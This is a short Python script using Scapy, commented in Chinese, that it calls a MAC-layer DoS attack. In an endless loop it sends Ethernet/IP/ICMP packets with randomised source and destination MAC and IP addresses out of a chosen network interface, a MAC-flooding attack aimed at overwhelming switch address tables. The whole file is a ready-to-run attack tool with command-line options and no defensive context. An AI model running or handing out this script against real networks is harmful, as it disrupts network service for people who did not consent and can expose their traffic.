from scapy.all import *
import optparse

def attack(interface):
    """
    执行MAC层的DoS攻击
    :param interface: 网络接口
    """
    # 构造以太网层、IP层和ICMP层的数据包，源MAC、目标MAC、源IP和目标IP均为随机生成
    packet = Ether(src=RandMAC(), dst=RandMAC()) / IP(src=RandIP(), dst=RandIP()) / ICMP()
    # 发送数据包
    sendp(packet, iface=interface, verbose=0)
    # 打印数据包摘要信息
    print(packet.summary())

def main():
    """
    主函数，解析命令行参数并开始攻击
    """
    # 创建命令行参数解析器
    parser = optparse.OptionParser("%prog " + "-i interface")
    # 添加-i选项，用于指定网络接口，默认值为eth0
    parser.add_option('-i', dest='interface', default='eth0', type='string', help='网络接口')
    # 解析命令行参数
    (options, args) = parser.parse_args()
    # 获取指定的网络接口
    interface = options.interface
    try:
        # 无限循环进行攻击
        while True:
            attack(interface)
    except KeyboardInterrupt:
        print('-------------')
        print('攻击结束！')

if __name__ == '__main__':
    main()